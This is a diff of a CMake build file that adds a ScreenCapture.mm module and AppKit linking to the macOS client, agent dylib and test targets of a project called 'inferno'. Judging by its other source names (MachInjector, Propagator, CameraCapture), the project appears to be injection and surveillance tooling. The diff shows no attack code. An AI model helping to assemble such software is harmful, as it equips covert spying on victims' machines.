@@ -102,7 +102,10 @@ if(WIN32)
         client/src/CameraCapture.cpp
     )
 else()
-    target_sources(inferno_client PRIVATE client/src/MachInjector.cpp)
+    target_sources(inferno_client PRIVATE
+        client/src/MachInjector.cpp
+        client/src/ScreenCapture.mm
+    )
 endif()
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
@@ -111,7 +114,8 @@ if(APPLE)
     find_library(CARBON Carbon)
     find_library(IO_KIT IOKit)
     find_library(CORE_FOUNDATION CoreFoundation)
-    target_link_libraries(inferno_client PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
+    find_library(APP_KIT AppKit)
+    target_link_libraries(inferno_client PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION} ${APP_KIT})
 endif()
 
 if(WIN32)
@@ -135,12 +139,14 @@ if(APPLE)
         client/src/Propagator.cpp
         client/src/EntitlementScanner.cpp
         client/src/MachInjector.cpp
+        client/src/ScreenCapture.mm
     )
     target_include_directories(inferno_agent_dylib PRIVATE client/include)
     target_compile_definitions(inferno_agent_dylib PRIVATE INFERNO_DYLIB)
     target_link_libraries(inferno_agent_dylib PRIVATE inferno_common)
+    find_library(APP_KIT AppKit)
     target_link_libraries(inferno_agent_dylib PRIVATE
-        ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION}
+        ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION} ${APP_KIT}
     )
     set_target_properties(inferno_agent_dylib PROPERTIES
         OUTPUT_NAME "inferno_agent"
@@ -273,6 +279,7 @@ else()
     target_sources(inferno_tests PRIVATE
         client/src/MachInjector.cpp
         client/src/entry_dylib.cpp
+        client/src/ScreenCapture.mm
     )
 endif()
 target_include_directories(inferno_tests PRIVATE client/include)
@@ -280,7 +287,8 @@ target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui
 target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)
 
 if(APPLE)
-    target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
+    find_library(APP_KIT AppKit)
+    target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION} ${APP_KIT})
     target_sources(inferno_tests PRIVATE
         tests/injector_test.cpp
     )
